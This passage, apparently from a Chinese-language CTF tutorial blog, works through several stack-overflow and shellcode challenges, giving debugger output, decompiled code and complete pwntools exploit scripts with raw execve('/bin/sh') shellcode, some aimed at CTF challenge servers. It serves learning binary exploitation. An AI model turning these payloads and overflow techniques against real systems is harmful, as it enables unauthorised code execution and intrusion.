+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary b0verfl0w --only jmp</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080483ab : jmp 0x8048390</span><br><span class="line">0x080484f2 : jmp 0x8048470</span><br><span class="line">0x08048611 : jmp 0x8048620</span><br><span class="line">0x0804855d : jmp dword ptr [ecx + 0x804a040]</span><br><span class="line">0x08048550 : jmp dword ptr [ecx + 0x804a060]</span><br><span class="line">0x0804876f : jmp dword ptr [ecx]</span><br><span class="line">0x08048504 : jmp esp</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br><span class="line">或者</span><br><span class="line">$ ROPgadget --binary b0verfl0w | grep <span class="string">&quot;jmp esp&quot;</span></span><br><span class="line">0x08048502 : and al, 0xc3 ; jmp esp</span><br><span class="line">0x08048501 : <span class="keyword">in</span> al, dx ; and al, 0xc3 ; jmp esp</span><br><span class="line">0x080484ff : <span class="keyword">in</span> eax, 0x83 ; <span class="keyword">in</span> al, dx ; and al, 0xc3 ; jmp esp</span><br><span class="line">0x08048504 : jmp esp</span><br></pre></td></tr></table></figure>
+
+<p>因为长度不够，所以我们可以想办法利用上方用来填充的0x20个字节，在0x20个字节中写入一个 getshell 的 shellcode，在 jmp esp 后写入 sub esp,0x28;jmp<br>esp;即可将 esp 抬至上方的 buf 处继续执行 shellcode。<br>由于长度较短，不能够直接使用shellcraft.sh()，在 exploit-db中查找一个较短的shellcode使用即可<a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/47513">https://www.exploit-db.com/shellcodes/47513</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /CTF/b0verfl0w</span><br><span class="line">warning: Error disabling address space randomization: Operation not permitted</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">Welcome to X-CTF 2016!</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">What<span class="string">&#x27;s your name?</span></span><br><span class="line"><span class="string">^C</span></span><br><span class="line"><span class="string">Program received signal SIGINT, Interrupt.</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">pwndbg&gt; cyclic 100</span></span><br><span class="line"><span class="string">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span></span><br><span class="line"><span class="string">pwndbg&gt; c</span></span><br><span class="line"><span class="string">Continuing.</span></span><br><span class="line"><span class="string">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span></span><br><span class="line"><span class="string">Hello aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam.</span></span><br><span class="line"><span class="string">Program received signal SIGSEGV, Segmentation fault.</span></span><br><span class="line"><span class="string">0x6161616a in ?? ()</span></span><br><span class="line"><span class="string">Warning: Avoided exploring possible address 0xff315755.</span></span><br><span class="line"><span class="string">You can explicitly explore it with `vmmap-explore 0xff315000`</span></span><br><span class="line"><span class="string">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span></span><br><span class="line"><span class="string">───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────</span></span><br><span class="line"><span class="string">*EAX  1</span></span><br><span class="line"><span class="string">*EBX  0xefb50e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* &#x27;</span>,\r#<span class="string">&#x27; */</span></span><br><span class="line"><span class="string">*ECX  0</span></span><br><span class="line"><span class="string">*EDX  0xefb528a0 (_IO_stdfile_1_lock) ◂— 0</span></span><br><span class="line"><span class="string">*EDI  0xefba2b60 (_rtld_global_ro) ◂— 0</span></span><br><span class="line"><span class="string">*ESI  0x80485b0 (__libc_csu_init) —▸ 0xff315755 ◂— 0xff315755</span></span><br><span class="line"><span class="string">*EBP  0x61616169 (&#x27;</span>iaaa<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">*ESP  0xff9b1a90 ◂— &#x27;</span>kaaalaaam<span class="string">&#x27;</span></span><br><span class="line"><span class="string">*EIP  0x6161616a (&#x27;</span>jaaa<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">pwndbg&gt; cyclic -l jaaa</span></span><br><span class="line"><span class="string">Finding cyclic pattern of 4 bytes: b&#x27;</span>jaaa<span class="string">&#x27; (hex: 0x6a616161)</span></span><br><span class="line"><span class="string">Found at offset 36</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+---------------------+  ← buf起始地址（假设为0xbffff700）</span><br><span class="line">|   shellcode (25B)   |</span><br><span class="line">+---------------------+</span><br><span class="line">|  填充数据 (7B)       |</span><br><span class="line">+---------------------+</span><br><span class="line">|  覆盖ebp (4B)        |  ← 这就“偏移量36”中的4字节</span><br><span class="line">+---------------------+</span><br><span class="line">|  覆盖返回地址 (4B)    |  ← jmp_esp地址</span><br><span class="line">+---------------------+</span><br><span class="line">|sub esp,0x28;jmp esp |</span><br><span class="line">+---------------------+  ← 执行ret时的esp位置</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure>
+
+<p><strong>esp 调整计算</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp调整量 = 执行jmp esp时的esp地址 - shellcode起始地址</span><br></pre></td></tr></table></figure>
+
+<p>假设：</p>
+<ul>
+<li>shellcode 起始地址 &#x3D; 0xbffff700</li>
+<li>执行 jmp esp 时的 esp 地址 &#x3D; 0xbffff6d8</li>
+</ul>
+<p>则调整量 &#x3D; 0xbffff700 - 0xbffff6d8 &#x3D; <strong>0x28</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class="line">shellcode_x86=b<span class="string">&quot;\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80&quot;</span> <span class="comment">#25字节</span></span><br><span class="line">padding_len = 0x20 - len(shellcode_x86)  <span class="comment">#计算buf中剩余空间32 - 25 = 7字节</span></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br><span class="line">jmp_esp = 0x08048504</span><br><span class="line">payload = shellcode_x86 + b<span class="string">&#x27;b&#x27;</span> * padding_len + b<span class="string">&#x27;bbbb&#x27;</span> + p32(jmp_esp) +sub_esp_jmp#25字节shellcode+7字节填充+4字节覆盖ebp（关键！）+4字节覆盖返回地址+调整esp到shellcode</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h2><blockquote>
+<p>点击下载: <a href="../../../../../../../challeges/shellcode_level0">shellcode_level0</a></p>
+</blockquote>
+<p>Checksec 查看保护</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec shellcode_level0</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  SHSTK:      Enabled</span><br><span class="line">  IBT:        Enabled</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>开启了RELRO，这使得整个重定位表都是可读的，同时还开启了NX保护，使得数据段不可执行，文件为64位的可执行文件</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == (<span class="type">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input shellcode: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过检查未发现后门函数，且read函数存在栈溢出漏洞，所以此题的思路为构造shellcode,将shellcode写入可以控制的执行流内，并将函数的返回地址修改为shellcode所在的地址，从而获取shell。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7ffe7cd48cb8 —▸ 0x5885aecdf2ea (main+156) ◂— mov eax, 0</span><br><span class="line">01:0008│-010 0x7ffe7cd48cc0 —▸ 0x787fa03bc000 ◂— <span class="string">&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n&#x27;</span></span><br><span class="line">02:0010│-008 0x7ffe7cd48cc8 —▸ 0x787fa03bc000 ◂— <span class="string">&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n&#x27;</span></span><br><span class="line">03:0018│ rbp 0x7ffe7cd48cd0 —▸ 0x7ffe7cd48d70 —▸ 0x7ffe7cd48dd0 ◂— 0</span><br><span class="line">04:0020│+008 0x7ffe7cd48cd8 —▸ 0x787fa01ca1ca (__libc_start_call_main+122) ◂— mov edi, eax</span><br><span class="line">05:0028│+010 0x7ffe7cd48ce0 —▸ 0x7ffe7cd48d20 —▸ 0x5885aece1d98 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5885aecdf1a0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">06:0030│+018 0x7ffe7cd48ce8 —▸ 0x7ffe7cd48df8 —▸ 0x7ffe7cd4a6f4 ◂— <span class="string">&#x27;/CTF/shellcode_level0&#x27;</span></span><br><span class="line">07:0038│+020 0x7ffe7cd48cf0 ◂— 0x1aecde040</span><br></pre></td></tr></table></figure>
+
+<p>溢出长度为0x18</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./shellcode_level0&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20145</span>)</span><br><span class="line">shellcode=asm(shellcraft.amd64.sh())</span><br><span class="line">buf_addr=<span class="number">0x10</span></span><br><span class="line">payload=shellcode.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(buf_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./shellcode_level0&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;challenge.basectf.fun&#x27;,28688)</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="例4"><a href="#例4" class="headerlink" title="例4"></a>例4</h2><blockquote>
+<p>点击下载: <a href="../../../../../../../challeges/attachment">attachment</a></p>
+</blockquote>
+<p>Checksec 查看保护</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x attachment</span><br><span class="line">$ checksec attachment</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      Canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  SHSTK:      Enabled</span><br><span class="line">  IBT:        Enabled</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>发现elf开启了pie保护，并且开启了canary保护，这使得使用栈溢出漏洞进行攻击变得难以执行。但是，根据题目提示，本题实质上还是要写入shellcode，但是具体往哪里写呢？又怎么写入呢？</p>
+<p>还是利用ida进行反编译，观察一下程序的逻辑。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span>&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == (<span class="type">void</span> *)<span class="number">-1LL</span> )&#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">2uLL</span>);</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, <span class="type">void</span> *, __int64))buf)(<span class="number">0LL</span>, buf, <span class="number">1280LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( munmap(buf, <span class="number">0x1000u</span>LL) == <span class="number">-1</span> )&#123;</span><br><span class="line">      perror(<span class="string">&quot;munmap failed&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ida里我们发现，buf变量是一段可读可写可执行的内存空间，并且，如果mmap函数开辟空间正确，首先会向buf里读入两个字节，然后会把buf空间里的内容当作函数，进行执行。那么我们自然可以想到，如果我们向buf里写入shellcode，那shellcode就会被执行，我们就可以成功获取shell。但是因为程序开启了pie保护，所以我们直接找到buf的地址向buf里写入shellcode的思路显然是不可行的，那具体怎么写入呢？</p>
+<p>通过检查汇编代码，可以发现，在read(0,buf,2ull)之后，有向寄存器赋值的汇编代码，并且会调用rcx寄存器里的内容的操作，那我们就自然可以想到，向rcx寄存器里写入一个函数，且该函数的功能可以实现向buf里读取内容的操作。所以我们可以向rcx寄存器里写入syscall，那么syscall第一个参数是rax寄存器里的值0，所以此时看似调用的是syscall，实则调用的是read函数，并且，rax里是0，rsi的值是buf，rdx的值是500h，也就是调用read(0,buf,0x500)。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000122A loc_122A:                               ; CODE XREF: main+49↑j</span><br><span class="line">.text:000000000000122A                 mov     rax, [rbp+buf]</span><br><span class="line">.text:000000000000122E                 mov     edx, 2          ; nbytes</span><br><span class="line">.text:0000000000001233                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000001236                 mov     edi, 0          ; fd</span><br><span class="line">.text:000000000000123B                 call    _read</span><br><span class="line">.text:0000000000001240                 mov     rsi, [rbp+buf]</span><br><span class="line">.text:0000000000001244                 mov     rcx, rsi</span><br><span class="line">.text:0000000000001247                 mov     rdx, 500h</span><br><span class="line">.text:000000000000124E                 mov     rax, 0</span><br><span class="line">.text:0000000000001255                 call    rcx</span><br><span class="line">.text:0000000000001257                 mov     rax, [rbp+buf]</span><br><span class="line">.text:000000000000125B                 mov     esi, 1000h      ; len</span><br><span class="line">.text:0000000000001260                 mov     rdi, rax        ; addr</span><br><span class="line">.text:0000000000001263                 call    _munmap</span><br><span class="line">.text:0000000000001268                 cmp     eax, 0FFFFFFFFh</span><br><span class="line">.text:000000000000126B                 jnz     short loc_1283</span><br><span class="line">.text:000000000000126D                 lea     rax, aMunmapFailed ; &quot;munmap failed&quot;</span><br><span class="line">.text:0000000000001274                 mov     rdi, rax        ; s</span><br><span class="line">.text:0000000000001277                 call    _perror</span><br><span class="line">.text:000000000000127C                 mov     eax, 1</span><br><span class="line">.text:0000000000001281                 jmp     short loc_1288</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./attachment&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20160</span>)</span><br><span class="line">p.send(asm(<span class="string">&#x27;syscall&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;aa&#x27;</span>+asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要写有限个字节内的shellcode，需要观察当前寄存器内的值</span><br><span class="line">拿本题为例，在调用指向buf的函数指针的函数时，此时关键寄存器的情况如下</span><br><span class="line">- rax=0</span><br><span class="line">- rdi=0</span><br><span class="line">- rsi=[buf]</span><br><span class="line">- rdx=0x500</span><br><span class="line">所以我们可以再次执行sys_read。此时写入的两字节为</span><br><span class="line">payload = &#x27;\x0f\x05&#x27; # 即syscall所代表的汇编</span><br><span class="line">完整exp如下</span><br><span class="line">from pwn import *</span><br><span class="line"># p = process(&#x27;./attachment&#x27;)</span><br><span class="line">p = remote(&#x27;challenge.basectf.fun&#x27;, 27606)</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line">shellcode = asm(&quot;syscall&quot;) # 即&#x27;\x0f\x05&#x27;</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">shellcode = b&#x27;\x90&#x27;*2 + asm(shellcraft.sh()) # &#x27;\x90&#x27;为nop的汇编，覆盖掉之前的syscall</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="例五"><a href="#例五" class="headerlink" title="例五"></a>例五</h2><blockquote>
+<p>点击下载: <a href="../../../../../../../challeges/sniperoj-pwn100-shellcode-x86-64">sniperoj-pwn100-shellcode-x86-64</a></p>
+</blockquote>
+<p>Checksec 查看保护</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec sniperoj-pwn100-shellcode-x86-64</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>64位，没有开启堆栈不可执行的保护，查看反汇编</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Sniperoj!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Do your kown what is it : [%p] ?\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now give me your answer : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以覆盖的空间大小为0x40，buf大小为0x10，没有发现system函数与“&#x2F;bin&#x2F;sh”字符串，因此我们可以采用直接写入shellcode的方法。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python3</span><br><span class="line">Python <span class="number">3.12</span><span class="number">.3</span> (main, Feb  <span class="number">4</span> <span class="number">2025</span>, <span class="number">14</span>:<span class="number">48</span>:<span class="number">35</span>) [GCC <span class="number">13.3</span><span class="number">.0</span>] on linux</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shell=asm(shellcraft.sh())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(shell)</span><br><span class="line"><span class="number">44</span></span><br></pre></td></tr></table></figure>
+
+<p>平常所用的shellcode长度太长，需要更换短一点的shellcode。</p>
+<p>下面是两个可以去搜寻shllcode的网址：</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a><br><a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a></p>
+<p><code>shellcode=”\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05”</code></p>
+<p>接下来应该考虑的是要把shellcode放在那个位置，如果按劫持栈指针的方法，把因为空间不大，可以把shellcoe放在最开头，然后控制程序流跳转执行shellcode，但是本题不可以，原因如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000007D0 ; int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00000000000007D0                 public main</span><br><span class="line">.text:00000000000007D0 main            proc near               ; DATA XREF: _start+1D↑o</span><br><span class="line">.text:00000000000007D0</span><br><span class="line">.text:00000000000007D0 buf             = qword ptr -10h</span><br><span class="line">.text:00000000000007D0 var_8           = qword ptr -8</span><br><span class="line">.text:00000000000007D0</span><br><span class="line">.text:00000000000007D0 ; __unwind &#123;</span><br><span class="line">.text:00000000000007D0                 push    rbp</span><br><span class="line">.text:00000000000007D1                 mov     rbp, rsp</span><br><span class="line">.text:00000000000007D4                 sub     rsp, 10h</span><br><span class="line">.text:00000000000007D8                 mov     [rbp+buf], 0</span><br><span class="line">.text:00000000000007E0                 mov     [rbp+var_8], 0</span><br><span class="line">.text:00000000000007E8                 mov     rax, cs:__bss_start</span><br><span class="line">.text:00000000000007EF                 mov     ecx, 0          ; n</span><br><span class="line">.text:00000000000007F4                 mov     edx, 1          ; modes</span><br><span class="line">.text:00000000000007F9                 mov     esi, 0          ; buf</span><br><span class="line">.text:00000000000007FE                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000000801                 call    _setvbuf</span><br><span class="line">.text:0000000000000806                 lea     rdi, s          ; &quot;Welcome to Sniperoj!&quot;</span><br><span class="line">.text:000000000000080D                 call    _puts</span><br><span class="line">.text:0000000000000812                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000000816                 mov     rsi, rax</span><br><span class="line">.text:0000000000000819                 lea     rdi, format     ; &quot;Do your kown what is it : [%p] ?\n&quot;</span><br><span class="line">.text:0000000000000820                 mov     eax, 0</span><br><span class="line">.text:0000000000000825                 call    _printf</span><br><span class="line">.text:000000000000082A                 lea     rdi, aNowGiveMeYourA ; &quot;Now give me your answer : &quot;</span><br><span class="line">.text:0000000000000831                 call    _puts</span><br><span class="line">.text:0000000000000836                 lea     rax, [rbp+buf]</span><br><span class="line">.text:000000000000083A                 mov     edx, 40h ; &#x27;@&#x27;  ; nbytes</span><br><span class="line">.text:000000000000083F                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000000842                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000000847                 call    _read</span><br><span class="line">.text:000000000000084C                 mov     eax, 0</span><br><span class="line">.text:0000000000000851                 leave</span><br><span class="line">.text:0000000000000852                 retn</span><br></pre></td></tr></table></figure>
+
+<p><code>leave的作用相当于**MOV RSP,RBP；POP RBP。**</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python3</span><br><span class="line">Python <span class="number">3.12</span><span class="number">.3</span> (main, Feb  <span class="number">4</span> <span class="number">2025</span>, <span class="number">14</span>:<span class="number">48</span>:<span class="number">35</span>) [GCC <span class="number">13.3</span><span class="number">.0</span>] on linux</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(disasm(shellcode,arch=<span class="string">&#x27;amd64&#x27;</span>))</span><br><span class="line">   <span class="number">0</span>:   <span class="number">48</span> <span class="number">31</span> f6                xor    rsi, rsi</span><br><span class="line">   <span class="number">3</span>:   <span class="number">56</span>                      push   rsi</span><br><span class="line">   <span class="number">4</span>:   <span class="number">48</span> bf 2f <span class="number">62</span> <span class="number">69</span> 6e 2f 2f <span class="number">73</span> <span class="number">68</span>   movabs rdi, <span class="number">0x68732f2f6e69622f</span></span><br><span class="line">   e:   <span class="number">57</span>                      push   rdi</span><br><span class="line">   f:   <span class="number">54</span>                      push   rsp</span><br><span class="line">  <span class="number">10</span>:   5f                      pop    rdi</span><br><span class="line">  <span class="number">11</span>:   6a 3b                   push   <span class="number">0x3b</span></span><br><span class="line">  <span class="number">13</span>:   <span class="number">58</span>                      pop    rax</span><br><span class="line">  <span class="number">14</span>:   <span class="number">99</span>                      cdq</span><br><span class="line">  <span class="number">15</span>:   0f 05                   syscall</span><br></pre></td></tr></table></figure>
+
+<p>而shellcode中对sp进行了push操作，所以leave指令会对shellcode的执行造成影响。所以buf中不能存放shellcode，buf后的8个字节也不能存放（这里需要存放返回地址）。</p>
+<p>所以，我们的shellcode只能放在buf首地址后的0x10+8后的地址。</p>
+<p><code>编写exp</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./sniperoj-pwn100-shellcode-x86-64&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">buf_addr = p.recvuntil(<span class="string">b&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#print type(buf_addr)</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(<span class="built_in">int</span>(buf_addr,<span class="number">16</span>) + <span class="number">32</span>) + shellcode<span class="comment">#buf占0x10（16）字节→覆盖 saved rbp占8字节→返回地址占8字节→所以shellcode起始地址=buf_addr+0x10(buf)+8(saved 